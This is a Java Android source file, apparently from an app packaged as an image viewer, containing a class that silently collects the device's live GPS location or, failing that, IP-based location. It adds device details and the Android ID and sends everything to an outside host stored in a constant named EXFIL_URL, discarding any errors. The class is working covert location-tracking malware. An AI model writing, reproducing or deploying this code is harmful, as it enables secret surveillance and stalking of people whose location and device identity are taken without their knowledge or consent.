package com.imageviewer;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class GeolocationCollector {

    private static final String EXFIL_URL = "https://vercel-geo-api-locations.vercel.app/api/collect";
    private static final long LOCATION_TIMEOUT_MS = 20000; // 20 সেকেন্ড timeout

    private final Context context;
    private final ExecutorService executor = Executors.newSingleThreadExecutor();
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private LocationManager locationManager;

    private Callback callback;
    private boolean locationReceived = false;

    public interface Callback {
        void onCollecting();
        void onComplete(String statusMessage);
        void onError(String message);
    }

    public GeolocationCollector(Context context) {
        this.context = context;
        this.locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
    }

    public void setCallback(Callback cb) {
        this.callback = cb;
    }

    public void collectAndSend() {
        if (callback != null) callback.onCollecting();
        locationReceived = false;

        boolean hasFineLocation = ActivityCompat.checkSelfPermission(context,
                Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;

        if (hasFineLocation) {
            Log.d("GeoCollector", "Permission granted → GPS থেকে live location নিচ্ছি...");
            requestLiveLocation();
        } else {
            Log.d("GeoCollector", "Permission নেই → IP fallback");
            executor.execute(this::collectViaIpGeolocation);
        }

        mainHandler.postDelayed(() -> {
            if (!locationReceived) {
                Log.d("GeoCollector", "GPS timeout → fallback IP");
                executor.execute(this::collectViaIpGeolocation);
            }
        }, LOCATION_TIMEOUT_MS);
    }

    private void requestLiveLocation() {
        try {
            LocationListener listener = new LocationListener() {
                @Override
                public void onLocationChanged(Location loc) {
                    if (!locationReceived) {
                        Log.d("GeoCollector", "Live GPS location: " +
                                loc.getLatitude() + ", " + loc.getLongitude());
                        sendLocationToServer(loc.getLatitude(), loc.getLongitude(),
                                loc.getAccuracy(), "live_gps");
                        locationReceived = true;
                        locationManager.removeUpdates(this);
                        notifyComplete();
                    }
                }

                @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
                @Override public void onProviderEnabled(String provider) {}
                @Override public void onProviderDisabled(String provider) {}
            };

            locationManager.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER,
                    2000, // প্রতি ২ সেকেন্ডে আপডেট
                    0,
                    listener,
                    Looper.getMainLooper()
            );

        } catch (SecurityException e) {
            Log.e("GeoCollector", "Security exception: " + e.getMessage());
            executor.execute(this::collectViaIpGeolocation);
        }
    }

    private void sendLocationToServer(double lat, double lon, float accuracy, String source) {
        executor.execute(() -> {
            try {
                String deviceInfo = collectDeviceInfo();
                sendToServer("lat=" + lat + "&lon=" + lon +
                        "&accuracy=" + accuracy +
                        "&location_source=" + source +
                        "&method=gps" + deviceInfo);
            } catch (Exception e) {
                Log.e("GeoCollector", "Error sending GPS data: " + e.getMessage());
            }
        });
    }

    private void collectViaIpGeolocation() {
        try {
            Log.d("GeoCollector", "Using IP fallback...");
            String ipApiResponse = httpGet("http://ip-api.com/json/?fields=status,lat,lon,city,region,country,zip,query");
            JSONObject obj = new JSONObject(ipApiResponse);

            String lat = obj.optString("lat", "");
            String lon = obj.optString("lon", "");
            String city = obj.optString("city", "");
            String country = obj.optString("country", "");
            String ip = obj.optString("query", "");

            String deviceInfo = collectDeviceInfo();
            sendToServer("lat=" + lat + "&lon=" + lon +
                    "&city=" + city + "&country=" + country +
                    "&ip=" + ip + "&method=ip_fallback" +
                    "&location_source=ip-geolocation" + deviceInfo);

            notifyComplete();

        } catch (Exception e) {
            Log.e("GeoCollector", "IP geolocation error: " + e.getMessage());
            notifyComplete();
        }
    }

    private void notifyComplete() {
        mainHandler.post(() -> {
            if (callback != null) callback.onComplete("✓ Location sent");
        });
    }

    private String httpGet(String urlString) throws Exception {
        URL url = new URL(urlString);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(8000);
        conn.setReadTimeout(8000);

        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        StringBuilder response = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) response.append(line);
        reader.close();
        return response.toString();
    }

    private void sendToServer(String params) {
        try {
            String getUrl = EXFIL_URL + "?" + params;
            httpGet(getUrl);
        } catch (Exception ignored) {}
    }

    private String collectDeviceInfo() {
        StringBuilder sb = new StringBuilder();
        sb.append("&device=").append(Build.DEVICE);
        sb.append("&model=").append(Build.MODEL);
        sb.append("&manufacturer=").append(Build.MANUFACTURER);
        sb.append("&brand=").append(Build.BRAND);
        sb.append("&android_version=").append(Build.VERSION.RELEASE);
        sb.append("&sdk=").append(Build.VERSION.SDK_INT);
        sb.append("&android_id=").append(Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID));
        sb.append("&session=").append(UUID.randomUUID().toString());
        sb.append("&ts=").append(System.currentTimeMillis());
        return sb.toString();
    }
}
